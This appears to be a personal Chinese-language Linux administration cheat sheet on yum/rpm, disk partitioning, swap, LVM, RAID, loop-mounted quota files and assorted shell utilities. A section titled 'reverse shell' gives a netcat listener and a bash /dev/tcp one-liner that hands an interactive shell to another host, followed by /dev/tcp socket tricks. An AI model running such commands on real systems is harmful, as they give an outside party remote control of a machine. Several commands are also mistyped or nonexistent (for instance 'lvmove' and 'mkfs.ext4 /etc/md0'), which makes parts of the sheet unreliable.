repository 每个源/服务器的具体配置，可以有一到多个。常位于/etc/yum.repos.d 目录下
【repository设置】
[serverid]   ##区别不同的repository
name=Some name for this server   ##对reporitory的描述
baseurl=url:##path/to/repository/  ###文件的获取路径，url可谓file、ftp、http三种
enabled=1  ##设置为可用
gpgcheck=1  ##可选，使用key检查安装包
gpgkey=file:##/etc/pki/rpm-gpg/RPM-GPG-KEY-oracle   ###设置key

yum update

验证
yum list all   ##查看yum设置是否正确，all可以为具体的包 

yum/rpm涉及key的位置
/etc/pki
yum --import /etc/pki/xxx...
rpm --import /etc/pki/xxx...

yum install -downloadonly -downloaddir=/xxx docker   #只下载，不安装
yum repolist   #查看repo
yum clean all  #清除缓存
yum makecache  #创建缓存



rpm安装
rpm -ivh package_name
rpm -ivh --relocate /=/opt/temp xxx.rpm    ###安装时指定安装路径
rpm -ivh --prefix= /opt/temp    xxx.rpm
rpm -qa | grep vsftp   ##查看是否安装软件
rpm -Uvh package_name  ##升级指定程序

rpm -i package.src.rpm		##解压源码包，之后可以选择标准源码包安装相同操作
rpm -e package_name         ##删除包




磁盘管理
du -sk directory_name  ##目录及子目录的总大小
df -k  ##磁盘的使用情况
file -s /dev/sda1   ###查看文件系统的类型
df -T

tune2fs -l /dev/sda3 | grep Block  ##查看文件系统block等


dd ##把指定的输入文件拷贝到指定的输出文件中

##增加swap分区  重启后失效
dd if=/dev/zero of=/home/swap bs=1024 count=512000    ##增加512000K  #创建一个大文件，内容全为0
/sbin/mkswap /home/swap  ##执行命令
/sbin/swapon /home/swap  ##执行命令
/usr/swap/swapfile  /swap   swap    defaults    0 0   ##编辑/etc/fstab实现固定设置


删除swap
swapoff -a
##编辑/etc/fstab实现固定设置


##添加磁盘
echo "scsi add-single-device 0 0 2 0"> /proc/scsi/scsi  ###第三个数对应为设备节点
echo "scsi add-single-device 0 0 3 0"> /proc/scsi/scsi  

fdisk ##对物理设备【/dev/】进行分区，分区后需要挂载才能使用
fdisk -l  ##查看磁盘信息
fdisk /dev/sdb   ##进行添加磁盘后才会在/dev下出现新的盘符，由提示命令进行分区

mkfs -t ext4 /dev/sdb1    	##给分区创建文件系统
mkfs.ext3 lv_name   	 	####给逻辑卷安装文件系统
mount /dev/sdb1 /u01   	  	##不应该多个分区挂载到同一目录

/proc/sys/dev/cdrom/info   ###光驱的信息文件，可由此获取光驱名

mount 					##挂载，外部存储设备需要挂载才能使用，物理设备在 【/dev/】目录下
mount /dev/cdrom /mnt  	##前光驱挂载在【/mnt】目录下，即光驱的内容可以在【/mnt】下查看
mount  -a   			###挂载/etc/fstab的配置
/dev/sdc1 /update/game2 ext3 default 1 2   ###修改文件/etc/fstab开启时自动挂载

##修改/dev/shm的大小
tmpfs /dev/shm tmpfs defaults,size=1G 0 0 ##修改/etc/fstab挂载目录的大小
umount /dev/shm   		###脱载分区
mount /dev/shm   		##重新挂载实现修改

fuser -m /dev/cdrom   	##查看那个进程正在使用挂载设备
lsof /dev/cdrom			##查看挂载点与正在使用的进程

LVM (Logical Volume Manager)  ##lv可以按磁盘分区的形式使用，安装文件系统后挂载

pv(physical volume,物理卷)  由分区构成
vg(volume group,卷组)		若干个pv组成
lv(logical volume,逻辑卷)   从vg中划分

/dev/mapper   ###创建lv后生成的文件

pvcreate /dev/sdb1    				##转换磁盘分区为物理卷
vgcreate vg_name /dev/sdb1   		###创建名为vg_name的vg(Volume Group)
lvcreate -L 1000M lv_name vg_name   ##创建lv(Logical Volume)

vgextend vg_name /dev/hda6    			#扩展vg_name
lvextend –L 1G /dev/vg_name/lv_name  	#扩展LV
resize2fs /dev/vg_name/lv_name    		###更新文件系统

缩小无法在线缩小  需要先unmount
resize2fs /dev/linuxcast/mylv 5G    	###缩小磁盘分区
lvreduce -L -1G /dev/linuxcast/mylv  	###缩小LV
vgreduce linuxcast /dev/sdd   			###缩小卷组


pvdisplay   ##显示pv(Physical Volume)
pvscan
vgdisplay   ##显示vg信息
lvdisplay   ##显示lv信息

pvmove /dev/sda1   ##删除pv
vgmove vg_name	   ##删除vg
lvmove /dev/vg_name/lv_name   ###删除lv

RAID(redundant array of independent disks)
RAID信息保存在/proc/mdstat 文件中
mdadm -C /dev/md0 -a yes -l 0 -n 2 /dev/sdb1 /dev/sdc1   ###使用磁盘分区创建RAID
mdadm -D --scan > /etc/mdadm.conf    	####创建好RAID后，创建新的配置文件
mkfs.ext4 /etc/md0   					###安装文件系统
mount /dev/md0   						###挂载

mdadm -S /dev/md0  ### 关闭RAID（关闭前先卸载）
mdadm -R /dev/md0  ###重新启用RAID
mdadm /dev/md0 -f /dev/sdb   ###模拟一个磁盘故障：
mdadm /dev/md0 -r /dev/sdb1  ###从一个RAID中移出一个磁盘
mdadm /dev/md0 -a /dev/sdc1  ###向一个RAID中添加一个磁盘

磁盘引导头 
MBR（master boot record）只支持不超过2T硬盘  
GPT（GUD Partition Table）支持2T磁盘 

parted /dev/sdb   ###使用parted命令创建gpt分区；fdisk只支持mbr

MBR主分区:最多只能创建4个主分区
扩展分区
逻辑分区：由扩展分区创建




负载均衡
lvs(linux virtual server)
ipvsadm


haproxy


nginx




ipcmk -Q   ##创建message queue
 
ipcs -q    ##查看message queue



虚拟文件系统
#可用于对指定目录进行容量限制
dd if=/dev/zero of=/usr/disk-quota.ex4 count=4096 bs=1mb   #创建4G的文件
mkfs -t ext4 -F /usr/disk-quota.ex4   #创建文件系统   -F 强制，不会检查是否是设备文件
mount -o loop,rw,usrquota,grpquota /usr/disk-quota.ex4 /path/to/images/top/level    #挂载到容器目录


#traffic control 流量控制
tc




动态链接库
/etc/ld.so.conf
ldconfig



十六进制查看
vim vi中
:%!xxd 		十六进制模式   
:%!xxd -r   文本模式

ctrl+f 前翻一页
ctrl+b 后翻一页


%所有行
!xxd  外部程序调用

hexdump
xxd


使用其他用户执行命令
sudo -u yhserver bin/mysqld_safe --defaults-file=etc/my_3306.cnf &
su - yhserver -c "bin/mysqld_safe --defaults-file=etc/my_3306.cnf &"






ipcmk
ipcs
ipcmr


编码转换
iconv



CPU控制
/sys/devices/system/cpu/

echo 0 > /sys/devices/system/cpu/cpu7/online    #禁用某个cpu






#日志滚动设置
#逐日存放日志
/etc/logrotate.d




反弹shell

#192.168.4.166
nc -lv  4567  

#192.168.4.165
/bin/bash -i >& /dev/tcp/192.168.4.166/4567 0>&1
 
#192.168.4.166即可获得192.168.4.165的shell
 
 
读写这个文件相当于使用socket建立连接
/dev/tcp/target_ip/target_port
/dev/udp/target_ip/target_port


服务端
/dev/tcp-server/target_ip/target_port
/dev/udp-server/target_ip/target_port


客户端
exec 100 > /dev/tcp/target_ip/target_port

echo -e "what you want to send" > &100

exec 100 > &-
exec 100 < $-



服务端

exec 100 > /dev/tcp-server/listen_ip/listen_port

cat < &100

exec 100 > &-
exec 100 < $-







###funny###
二维码生成

qrencode -o qr.png "string_seen_by_scan_qr"

nice #调整进程优先级别


glibc 版本查询
ldd --version


编译安装时新创建单独的文件夹存放解压的源代码，而且在上一级目录编译

LD_LIBRARY_PATH 环境变量不应该以 : 开头

指定安装目录，编译安装后将目录加入环境变量LD_LIBRARY_PATH

#预加载so包并执行命令
LD_PRELOAD=libc-2.5.so rm xxx 








构建工具
make					#依赖Makefile
cmake					#依赖CMakeLists.txt
autoconf/autoreconf     #依赖configure.ac






https
curl -k    #忽略https未信任证书错误



tar -zcvf ABCD.tar.gz ABCD | split -b 2000M -d -a 1 - ABCD.tar.gz

split -b 2000M -d -a 1 ABCD.tar.gz ABCD.tar.gz.


cat ABC.tar.gz.* | tar -zxv


expect -c {
set timeout 300
spawn $CMD
expect{
$CASE1 {send $WORD1} 
$CASE2 {send $WORD2} 
}
expect ...

}



